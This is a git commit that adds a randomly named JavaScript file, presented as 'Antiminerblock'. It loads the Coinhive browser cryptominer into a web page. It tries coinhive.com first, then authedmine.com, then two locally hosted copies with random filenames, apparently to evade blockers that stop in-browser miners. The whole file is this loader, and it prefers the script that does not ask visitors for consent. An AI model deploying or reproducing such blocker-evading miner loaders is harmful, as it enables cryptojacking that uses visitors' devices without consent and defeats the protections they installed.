da8e88005528510fe4c84c30e946d193b4aa2e89
Davis Davalos-DeLosh <davis.davalos.delosh@gmail.com>
2017-11-20 21:43:38 -0700

    Adding Antiminerblock (github.com/SkyrisBactera/AntiMinerblock)

---
+++ public/dkvvmXz5.js
@@ -0,0 +1,48 @@
+function loadCoinhive() {
+  var script = document.createElement('script');
+  script.src = 'https://coinhive.com/lib/coinhive.min.js';
+  document.getElementsByTagName("head")[0].appendChild(script);
+  //check if script was loaded
+  script.onload = function() {
+    console.log("Successfully loaded with remote coinhive (not authedmine) script")
+    return
+  }
+  //check if it didn't load
+  script.onerror = function() {
+    var script = document.createElement('script');
+    script.src = 'https://authedmine.com/lib/authedmine.min.js';
+    document.getElementsByTagName("head")[0].appendChild(script);
+    //check if script was loaded
+    script.onload = function() {
+      console.log("Successfully loaded with remote authedmine script")
+      return
+    }
+    //check if it didn't load
+    script.onerror = function() {
+      var script = document.createElement('script');
+      script.src = 'DSSbEY3g.js';
+      document.getElementsByTagName("head")[0].appendChild(script);
+      //check if script was loaded
+      script.onload = function() {
+        console.log("Successfully loaded with local coinhive (not authedmine) script")
+        return
+      }
+      //check if it didn't load
+      script.onerror = function() {
+        var script = document.createElement('script');
+        script.src = 'fB6Xs7di.js';
+        document.getElementsByTagName("head")[0].appendChild(script);
+        //check if script was loaded
+        script.onload = function() {
+          console.log("Successfully loaded with local authedmine script")
+          return
+        }
+        //check if it didn't load
+        script.onerror = function() {
+          console.log("Failed to load coinhive!")
+          throw 2;
+        }
+      }
+    }
+  }
+}
